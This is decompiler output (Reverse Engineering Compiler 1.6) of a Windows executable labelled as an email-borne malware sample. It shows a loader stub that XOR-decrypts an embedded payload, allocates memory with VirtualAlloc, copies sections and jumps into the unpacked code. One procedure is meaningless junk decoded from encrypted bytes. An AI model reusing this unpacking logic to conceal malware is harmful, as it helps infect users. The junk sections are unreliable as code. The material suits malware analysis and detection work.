/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1197/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401020 - 0x004011A5
 *	Argument size: -80
 *	Local size: 84
 *	Save regs size: 0
 */

__entry_point__(Ad5)
/* unknown */ void  Ad5;
{
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffffc;



    L00401270( & Vffffffe4);
    ecx = Vffffffe4;
    edx = ecx;
    eax = 774176 + (ecx << 14) & -65536;
    edx = edx << 9;
    ecx = eax + -98740;
    ebx = *(ecx + edx);
    ecx = ecx + edx;
    ebx = ebx - 40;
    *(ebp + -225 + Vffffffe4) = ebx;
    Vffffffec = eax + *(ecx - 4) + 249 - Vffffffe4;
    (save) & Vfffffffc;
    (save)4;
    (save)Vfffffff0;
    (save)Vffffffec;
    *(0x4010dd - Vffffffe4)();
    L00401200(Vffffffec, Vfffffff0, Vffffffe4);
    ebx = Vffffffec;
    esi = ebx;
    ebx = *(ebx + 269 - Vffffffe4) + esi;
    Vffffffe8 = *(ebx + 6) & 255;
    ecx = Vffffffe4 << 5;
    (save)-6624 + ecx;
    (save)12288;
    eax = ebx + 3424;
    (save) *(eax - (ecx >> 1));
    (save) *(ebx + 52);
    eax = *__imp__VirtualAlloc();
    Vfffffffc = eax;
    L00401250( *(ebx + 293 - Vffffffe4), Vffffffec, Vfffffffc);
    esi = ebx + 248;
    do {
        L00401250( *(esi + 16), Vffffffec + *(esi + 20), Vfffffffc + *(esi + 12));
        esi = esi + 40;
    } while(Vffffffe8 = Vffffffe8 - 1);
    ecx = *(ebx + -169 + Vffffffe4) + Vfffffffc;
    *( & Ad5 - Vffffffe4) = ecx;
    edx = Vffffffe4;
    (save)ebp + -293 + edx;
    (save)1427582266 - edx - 1423383235;
    (save)-153 + edx;
    *(4185616 + (Vffffffe4 << 6))();
    L00401200( & Vffffffac, 56, Vffffffe4);
    ecx = Vffffffe4 + 1441050953 - -1423383235;
    eax = Vfffffffc;
    do {
        eax = eax + 1;
    } while(*eax != ecx);
    return(L00401250(265 - Vffffffe4, ebp + -293 + Vffffffe4, eax));
}

/*	Procedure: 0x004011A6 - 0x004011DD
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004011A6()
{



    al = al >> 65;
    asm("popf");
    asm("clc");
    *(ebx + eax * 2 + 1330519401) = *(ebx + eax * 2 + 1330519401) - ah;
    asm("jpe 0x4011ca");
    asm("clc");
    (restore)edx;
    asm("%g inc esp");
    asm("popa");
    1316040068 = *(ecx + edi * 4 + 407057800) * ecx;
    asm("rcr byte [ebx],cl");
    asm("popf");
    asm("wait");
    edi = *(ebp - 12);
    asm("int 0xf3");
    eax = *LAC9DC299 + 1;
    bh = 71;
    *L50B57B80 = fs;
}

/*	Procedure: 0x00401200 - 0x00401242
 *	Argument size: 4
 *	Local size: 8
 *	Save regs size: 0
 */

L00401200(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    ecx = Ac;
    eax = 939144012 + A10;
    Vfffffff8 = 195687590;
    for(Vfffffffc = 1; 1; Vfffffffc = ~Vfffffffc) {
        *ebx = *ebx ^ eax;
        if(ecx = ecx - 4) {
            break;
        }
        eax = eax + Vfffffff8 + Vfffffffc;
        ebx = ebx + 213 - A10;
    }
}

/*	Procedure: 0x00401243 - 0x0040124F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401243()
{



}

/*	Procedure: 0x00401250 - 0x0040126C
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 8
 */

L00401250(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edi = A10;
    esi = Ac;
    ecx = A8;
    do {
        *edi = *esi;
        esi = esi + 1;
        edi = edi + 1;
    } while(ecx = ecx - 1);
}

/*	Procedure: 0x0040126D - 0x0040126F
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040126D()
{



    asm("int3");
    asm("int3");
    asm("int3");
}

/*	Procedure: 0x00401270 - 0x00401297
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L00401270(A4)
/* unknown */ void  A4;
{



    eax = 9;
    eax = *L7FFE0300();
    edx = (eax >> 24) + 16;
    eax = (eax & 15) + edx - 1;
    *A4 = eax;
}

/*	Procedure: 0x00401298 - 0x00000000
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L00401298()
{



}

/* address  size  */
/* 0x00401000       0 */ /* unknown */ void 	__imp__GetCommandLineA;
/* 0x00401004       0 */ /* unknown */ void 	__imp__CreateFileA;
/* 0x00401008       0 */ /* unknown */ void 	__imp__VirtualAlloc;
/* 0x0040100c       0 */ /* unknown */ void 	__imp__VirtualProtect;
/* 0x00401010       0 */ /* unknown */ void 	__imp__GetModuleHandleA;
/* 0x00401020       0 */ /* unknown */ void 	__entry_point__;
#if 0 /* auxiliary information */
# Current option values:
option: +asmflush
option: -compactcalls
option: +compactexprs
option: +compactifs
option: +compset
option: -dfoproc
option: -disasmonly
option: -displaylabels
option: +doblocks
option: +docase
option: +dofor
option: +doifs
option: +dointrinsics
option: +doloops
option: +donullgotos
option: +dopackloops
option: +dopackstmt
option: +doremlabs
option: +dosimplify
option: -dosort
option: +dostmts
option: +doswitch
option: +dowhile
option: -dumpaddrs
option: -dumpcall
option: -dumpcomments
option: -dumpdfo
option: +dumpdoms
option: -dumpsblocks
option: -dumpsets
option: -dumpsizes
option: -dumpstmtid
option: +fatcase
option: -flag16
option: +fullscreen
option: -genpattern
option: -help
option: -hexconst
option: -html
option: +insertlabels
option: -int16
option: +int32
option: -interactive
option: -isvb5
option: +locals
option: -nohtmltabs
option: -nostackoffs
option: -objdump
option: -okclone
option: -outprocs
option: -outrefs
option: -overrule
option: +rdonly
option: -showblocks
option: -showjump
option: -showlabel
option: -showprotosym
option: -showreg
option: -showstring
option: -silent
option: +simplifyexprs
option: -stackalign16
option: -stackalign4
option: -stackalign8
option: -strallregions
option: -traceall
option: -tracesets
option: +types
option: -usesymtab
option: -validatebr
option: -validatereg
option: +validatestr
#endif
